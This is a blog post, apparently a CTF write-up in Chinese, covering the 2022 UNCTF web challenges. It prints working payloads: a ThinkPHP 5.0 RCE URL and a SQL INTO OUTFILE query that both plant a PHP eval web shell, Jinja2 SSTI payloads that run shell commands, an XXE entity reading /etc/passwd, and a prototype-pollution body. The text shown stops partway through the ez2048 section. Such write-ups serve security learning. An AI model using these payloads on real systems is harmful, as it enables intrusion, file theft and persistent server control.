<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2022UNCTF | Slagman</title><meta name="author" content="Slagman"><meta name="copyright" content="Slagman"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Web我太喜欢bilibili大学啦搜索flag发现hint   Base64解出来是admin_unctf.php F12发现hint2   抓包发现hint2   解出来是账号密码，均为unctf2022 审计源码   发现就是个cookie传参的命令执行  ||没有被过滤，直接用cat &#x2F;flag发现flag是空的，找了很久才发现在环境里面，也就是env里面  flag:UNCTF&amp;#123">
<meta property="og:type" content="article">
<meta property="og:title" content="2022UNCTF">
<meta property="og:url" content="https://slagman34.github.io/2023/07/11/2022UNCTF/index.html">
<meta property="og:site_name" content="Slagman">
<meta property="og:description" content="Web我太喜欢bilibili大学啦搜索flag发现hint   Base64解出来是admin_unctf.php F12发现hint2   抓包发现hint2   解出来是账号密码，均为unctf2022 审计源码   发现就是个cookie传参的命令执行  ||没有被过滤，直接用cat &#x2F;flag发现flag是空的，找了很久才发现在环境里面，也就是env里面  flag:UNCTF&amp;#123">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2023/07/10/eM7GL5mcOtFQfsk.jpg">
<meta property="article:published_time" content="2023-07-11T08:28:15.000Z">
<meta property="article:modified_time" content="2023-07-11T09:18:49.629Z">
<meta property="article:author" content="Slagman">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2023/07/10/eM7GL5mcOtFQfsk.jpg"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://slagman34.github.io/2023/07/11/2022UNCTF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?33238508aafdb028a3a363c8f8eda09c";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"LML7PURDYP","apiKey":"8079017f9c52c4c13ef1aa9fb7772381","indexName":"slagman_index","hits":{"per_page":6},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Slagman","link":"链接: ","source":"来源: Slagman","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '2022UNCTF',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-07-11 17:18:49'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><script src="/live2d-widget/autoload.js"></script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/07/10/4mKeB5O1ZjaYuFU.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2023/07/10/eM7GL5mcOtFQfsk.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Slagman"><span class="site-name">Slagman</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2022UNCTF</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-11T08:28:15.000Z" title="发表于 2023-07-11 16:28:15">2023-07-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-11T09:18:49.629Z" title="更新于 2023-07-11 17:18:49">2023-07-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/2022CTF/">2022CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>27分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2022UNCTF"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="我太喜欢bilibili大学啦"><a href="#我太喜欢bilibili大学啦" class="headerlink" title="我太喜欢bilibili大学啦"></a>我太喜欢bilibili大学啦</h2><p>搜索flag发现hint</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711163150495.png" alt="image-20230711163150495"> </p>
<p>Base64解出来是admin_unctf.php</p>
<p>F12发现hint2</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711163201188.png" alt="image-20230711163201188"> </p>
<p>抓包发现hint2</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711163440350.png" alt="image-20230711163440350"> </p>
<p>解出来是账号密码，均为unctf2022</p>
<p>审计源码</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711163447458.png" alt="image-20230711163447458"> </p>
<p>发现就是个cookie传参的命令执行</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711163455301.png" alt="image-20230711163455301"  /></p>
<p>||没有被过滤，直接用cat /flag发现flag是空的，找了很久才发现在环境里面，也就是env里面</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711163532594.png" alt="image-20230711163532594"></p>
<p>flag:<code>UNCTF&#123;52aee0bb-bfe3-4c9a-a7f9-174b9c197869&#125;</code></p>
<p>Ps:忘了自己是直接搜flag出的，还跟着下面那个修复版走了一遍完整流程。。</p>
<h2 id="ezgame"><a href="#ezgame" class="headerlink" title="ezgame"></a>ezgame</h2><p>游戏题，经验去看js，搜索unctf关键词</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/wps7.jpg" alt="img"></p>
<p>发现很多字符串，有’{‘也有’}’,复制出来一个列表</p>
<p>[‘86VkibmA’,’fe7b163f8d’,’6833565vBFVDj’,’23742ODGjjF’,’unctf{c5f9’,’d3}’,’1335DfKYdi’,’6442920PCnqhb’,’781140poNcpx’,’a27d-6f88-‘,’795305dViflS’,’1569524rbiRmt’,’49fb-a510-‘,’88IpXszc’,’13033ieCwIU’,’6GgaKPA’]</p>
<p>中间也有很明显的标志符号’-’，结合unctf后面的c5f9，懒得去看代码，猜测是在游戏通关之后调用这个列表中的某些个字符串来拼接成一个完整的flag输出，特征很明显是uuid的格式，即8-4-4-4-12，那么拿出几个字符串拼接一下，’fe7b163f8d’ ‘unctf{c5f9’ ‘d3}’ ‘a27d-6f88-‘ ‘49fb-a510-‘，中间尝试一下，得到flag</p>
<p>flag:<code>UNCTF&#123;c5f9a27d-6f88-49fb-a510-fe7b163f8dd3&#125;</code></p>
<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>F12发现hint</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711163748396.png" alt="image-20230711163748396"> </p>
<p>登录成功之后发现啥也没有，尝试一下其他的学号，输了连续的三个学号发现回显f,l,a，那么应该是连续爆字符拼接，用burp的攻击模块</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711163754847.png" alt="image-20230711163754847"></p>
<p>直到20200139就没了</p>
<p>flag:<code>flag&#123;bfff6d206cbcd6ac0870a4f48c7c313b&#125;</code></p>
<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p>主页是apache的页面，一看就假的，进index.php看</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711163825272.png" alt="image-20230711163825272"></p>
<p>php代码审计，很典型的几种绕过，第一关%0a截断，传a=0%0a，第二关经典数组绕过，传key1[]=1&amp;key2[]=2，第三关直接传马，在1后面命令执行就不会被过滤了</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711163840293.png" alt="image-20230711163840293"></p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711163844097.png" alt="image-20230711163844097"></p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711163848155.png" alt="image-20230711163848155"></p>
<p>flag:<code>UNCTF&#123;99hanDis_pHP_Ba_True_flag&#125;</code></p>
<h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p>扫目录发现有源码泄露，访问www.rar，得到源码</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711163915841.png" alt="image-20230711163915841"></p>
<p>很简单的MIME过滤，直接抓包改content-type就能绕过传马</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711163933411.png" alt="image-20230711163933411"></p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711163953866.png" alt="image-20230711163953866"></p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711164002050.png" alt="image-20230711164002050"></p>
<p>flag:<code>UNCTF&#123;cf3d509a-58d8-4453-be26-8147f961717f&#125;</code></p>
<h2 id="我太喜欢bilibili大学啦修复版"><a href="#我太喜欢bilibili大学啦修复版" class="headerlink" title="我太喜欢bilibili大学啦修复版"></a>我太喜欢bilibili大学啦修复版</h2><p>同第一题，就是flag位置改变，放在根目录了</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711164100614.png" alt="image-20230711164100614"></p>
<p>Base64解密一下即可是个b站网址，访问一下即可拿到flag</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711164107681.png" alt="image-20230711164107681"></p>
<p>flag:<code>UNCTF&#123;this_is_so_easy&#125;</code></p>
<h2 id="给你一刀"><a href="#给你一刀" class="headerlink" title="给你一刀"></a>给你一刀</h2><p>?s=1知道是Thinkphp5.0.20版本，直接上网搜rce一把梭</p>
<p>写个shell进去</p>
<p>Payload：</p>
<p><code>?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=zxc1.php&amp;vars[1][]=%3C?php%20@eval($_POST[a]);?%3E</code></p>
<p>还是在env里面</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711164232874.png" alt="image-20230711164232874"></p>
<p>flag:<code>UNCTF&#123;Y0u_A3r_so_G9eaD_hacker&#125;</code></p>
<h2 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy ssti"></a>easy ssti</h2><p>发现登录页面不管什么数据都能进，在第二个页面发现根据用户名不同在</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711164413864.png" alt="image-20230711164413864"></p>
<p>你好的位置回显不同，结合题目应该ssti回显在这里，用2测试一下</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711164426659.png" alt="image-20230711164426659"></p>
<p>发现正确，于是查找一把梭脚本，毕竟自己不会ssti，随便试了几个发现过滤了class关键字</p>
<p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p>
<p>可以绕过也可以用另一种形式的payload</p>
<p>Payload1：<code>&#123;&#123;url_for.__globals__['__builtins__']['eval']("__import__('os').popen('env').read()")&#125;&#125;</code></p>
<p>Payload2：<code>&#123;%for i in ""["__cla"+"ss__"]["__mr"+"o__"][1]["__subcla"+"sses__"]()%&#125;&#123;%if i.__name__ == "_wrap_close"%&#125;&#123;%print i["__in"+"it__"]["__glo"+"bals__"]["po"+"pen"]('env')["read"]()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</code></p>
<p>同样也是在env里面。</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711164508811.png" alt="image-20230711164508811"></p>
<p>flag:<code>UNCTF&#123;724cf98e-5e75-437f-8f68-1c2bfff57c45&#125;</code></p>
<h2 id="302与深大"><a href="#302与深大" class="headerlink" title="302与深大"></a>302与深大</h2><p>既然302，那么就抓包回到原来的页面</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711164640724.png" alt="image-20230711164640724"></p>
<p>按要求传参，同样要抓包，还得用POST形式</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711164646485.png" alt="image-20230711164646485"></p>
<p>Cookie伪造，admin=1试了不行，那就admin=true</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711164656498.png" alt="image-20230711164656498"></p>
<p>搜索flag找到完整的</p>
<p>flag:<code>UNCTF&#123;thai_miku_micgo_qka_WEB_GOD&#125;</code></p>
<h2 id="听说php有一个xxe"><a href="#听说php有一个xxe" class="headerlink" title="听说php有一个xxe"></a>听说php有一个xxe</h2><p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711164720981.png" alt="image-20230711164720981"></p>
<p>下载得到hint</p>
<p>百度大法，先构造一个恶意xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
<p>然后抓包POST</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711164755409.png" alt="image-20230711164755409"></p>
<p>发现成功读取，那么就读取根目录下的flag</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711164812674.png" alt="image-20230711164812674"></p>
<p>flag：<code>flag&#123;th8s_1s_Fla9&#125;</code></p>
<h2 id="babynode"><a href="#babynode" class="headerlink" title="babynode"></a>babynode</h2><p>参考大佬博客</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html?page=1">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html?page=1</a></p>
<p>最简单的node原型链污染，利用了copy函数，这个参考ctfshow的web338，构造payload：<code>&#123;&#123;"__proto__":&#123;"id":"unctf"&#125;&#125;</code></p>
<p>POST传参，记得要添加content-type为application/json，不然服务端识别不出来POST的数据格式</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711164840057.png" alt="image-20230711164840057"></p>
<p>flag:<code>UNCTF&#123;22ca8686bfa31a2ae5f55a7f60009e14&#125;</code></p>
<h2 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h2><p>很经典的单引号字符型注入，回显结果在F12里面，fuzz了一下过滤了很多关键词，类似select，where，from，and，or等等，不过直接大写就可以绕过，注入步骤payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">From infOrmation_schema.schemata),2 --+  爆库名</span><br><span class="line">-1’ union Select (Select group_concat(table_name) </span><br><span class="line">From infOrmation_schema.tables Where table_schema=”库名”),2 --+ 爆表名</span><br><span class="line">-1’ union Select (Select group_concat(column_name) </span><br><span class="line">From infOrmation_schema.columns Where table_schema=”库名” And table_name=”表名”),2 --+  爆列名</span><br></pre></td></tr></table></figure>
<p>查遍了都没找到，下面是查出来的结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">information_schema</span><br><span class="line">ctftraining (FLAG_TABLE(FLAG_COLUMN),news(id,title,content,time),users)</span><br><span class="line">test(NULL)</span><br><span class="line">mysql(column_stats,columns_priv,db,event,func,general_log,global_priv,gtid_slave_pos,help_category,help_keyword,help_relation,help_topic,index_stats,innodb_index_stats,innodb_table_stats,plugin,proc,procs_priv,proxies_priv,roles_mapping,servers,slow_log,table_stats,tables_priv,time_zone,time_zone_leap_second,time_zone_name,time_zone_transition,time_zone_transition_type,transaction_registry,user)</span><br><span class="line">performance_schema</span><br><span class="line">admin(haha(id,data))</span><br><span class="line">user(NULL)</span><br></pre></td></tr></table></figure>
<p>后来百度看到可以select写shell的，学到了，于是写了个shell进去</p>
<p>Payload：<code>-1&#39; union Select 1,&quot;&lt;?php @eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot; --+</code></p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711165409506.png" alt="image-20230711165409506"></p>
<p>连接一下在根目录拿到flag</p>
<p>flag：<code>UNCTF&#123;2893afae-75c6-427f-bff1-b786acc38ee8&#125;</code></p>
<h2 id="ez2048"><a href="#ez2048" class="headerlink" title="ez2048"></a>ez2048</h2><p>这题感觉都不像web了，感觉是个re题目，首先就是先找到邀请码，去源代码里面找到game.js分析js脚本</p>
<p>关键位置，校验邀请码的函数</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711165430502.png" alt="image-20230711165430502"></p>
<p>我java没学过，前面的set值也不清楚到底存储到view里面的是什么，于是找了个在线网站运行了一下</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711165436791.png" alt="image-20230711165436791"></p>
<p>发现就是一个一个存进数组里去，但是这里有个关键，如果不调试的话就有可能进入大端序小端序的误区，当这个setUint方法的里面第三个参数为true的话，就是大端序读取，于是得到下面串数组，再回到函数位置。我的理解是输入一串code，进入函数进行异或运算，偶数位置与下一位进行异或输出，奇数位与往前数第二位的字符异或，因为if判断的i前面有个取反，所以这里要注意点，写了个脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">s=[<span class="string">&#x27;44&#x27;</span>,<span class="string">&#x27;33&#x27;</span>,<span class="string">&#x27;0f&#x27;</span>,<span class="string">&#x27;50&#x27;</span>,<span class="string">&#x27;5d&#x27;</span>,<span class="string">&#x27;0e&#x27;</span>,<span class="string">&#x27;3a&#x27;</span>,<span class="string">&#x27;32&#x27;</span>,<span class="string">&#x27;58&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;2a&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;0d&#x27;</span>,<span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;12&#x27;</span>,<span class="string">&#x27;05&#x27;</span>,<span class="string">&#x27;02&#x27;</span>,<span class="string">&#x27;56&#x27;</span>,<span class="string">&#x27;00&#x27;</span>,<span class="string">&#x27;02&#x27;</span>,<span class="string">&#x27;00&#x27;</span>,<span class="string">&#x27;13&#x27;</span>,<span class="string">&#x27;00&#x27;</span>,<span class="string">&#x27;00&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    s[i]=<span class="built_in">int</span>(s[i],<span class="number">16</span>)</span><br><span class="line">code=[<span class="number">0</span>]*<span class="number">24</span></span><br><span class="line">code[<span class="number">1</span>]=s[<span class="number">1</span>]</span><br><span class="line">code[<span class="number">0</span>]=s[<span class="number">0</span>]^code[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">23</span>,<span class="number">2</span>):</span><br><span class="line">    code[i+<span class="number">2</span>]=code[i]^s[i+<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">24</span>,<span class="number">2</span>):</span><br><span class="line">    code[i]=code[i+<span class="number">1</span>]^s[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#w3lc0me_7o_unctf2022!!!!</span></span><br></pre></td></tr></table></figure>
<p>得到邀请码为w3lc0me_7o_unctf2022!!!!，输进去就开始玩游戏了，但是我2048玩的太烂了，于是回到源码再看，去看输入邀请码检查的位置</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711165516457.png" alt="image-20230711165516457"></p>
<p>发现个allocatedInvitedCode，搜索看哪里还调用过</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711165522479.png" alt="image-20230711165522479"></p>
<p>看到这里应该知道这个是检查是否玩成功的函数了，这个result应该也是flag，</p>
<p>但是这个check_success函数在js里面并没有找到，在game.wasm里面找到了</p>
